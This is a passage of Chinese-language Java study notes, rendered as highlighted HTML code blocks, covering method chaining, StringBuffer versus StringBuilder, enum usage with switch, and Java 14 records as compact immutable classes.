&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Adder&lt;/span> &lt;span style="color:#111">adder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Adder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">adder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">3&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">5&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">inc&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">10&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">adder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Adder&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Adder&lt;/span> &lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Adder&lt;/span> &lt;span style="color:#75af00">inc&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">++;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">sum&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>StringBuffer&lt;/code>和&lt;code>StringBuilder&lt;/code>接口完全相同，是早期版本，通过同步来保证多个线程操作&lt;code>StringBuffer&lt;/code>也是安全的，但是同步会带来执行速度的下降&lt;/li>
&lt;/ul>
&lt;h3 id="enum">enum&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Weekday&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Weekday&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SUN&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Weekday&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SAT&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Weekday&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SUN&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Work at home!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Work at office!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">enum&lt;/span> &lt;span style="color:#111">Weekday&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 只需依次列出枚举的常量名
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">SUN&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">MON&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">TUE&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">WED&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">THU&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">FRI&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SAT&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>&lt;code>enum&lt;/code>常量本身带有类型信息，即&lt;code>Weekday.SUN&lt;/code>类型是&lt;code>Weekday&lt;/code>，编译器会自动检查出类型错误&lt;/p>
&lt;/li>
&lt;li>
&lt;p>不可能引用到非枚举的值，因为无法通过编译&lt;/p>
&lt;/li>
&lt;li>
&lt;p>不同类型的枚举不能互相比较或者赋值，因为类型不符&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>enum&lt;/code>虽然也是引用类型，但因为其在JVM中只有唯一实例，所以可以直接用&lt;code>==&lt;/code>比较&lt;/p>
&lt;/li>
&lt;li>
&lt;p>继承自&lt;code>java.lang.Enum&lt;/code>，无法被继承，无法new实例&lt;/p>
&lt;/li>
&lt;li>
&lt;p>枚举类的字段也可以是非final类型，即可以在运行期修改，但是不推荐这样&lt;/p>
&lt;/li>
&lt;li>
&lt;p>天生适合switch，具有类型信息和有限个枚举常量&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Weekday&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Weekday&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SUN&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">switch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">day&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">MON&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">TUE&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">WED&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">THU&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">FRI&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Today is &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;. Work at office!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">SAT&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">SUN&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Today is &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">day&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;. Work at home!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cannot process &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">day&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">enum&lt;/span> &lt;span style="color:#111">Weekday&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">MON&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">TUE&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">WED&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">THU&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">FRI&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SAT&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SUN&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="record">record&lt;/h3>
&lt;p>java14开始&lt;/p>
&lt;ul>
&lt;li>不变类的class和字段都使用&lt;code>final&lt;/code>关键字，无法派生子类，创建实例后无法修改任何字段&lt;/li>
&lt;li>创建不变类后为了保证不变类的比较，还需要正确覆写&lt;code>equals()&lt;/code>和&lt;code>hashCode()&lt;/code>方法，手动覆写很麻烦，可以直接用record一行写出不变类&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Point&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Point&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">456&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">record&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后一行相当于&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Point&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Record&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Point&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
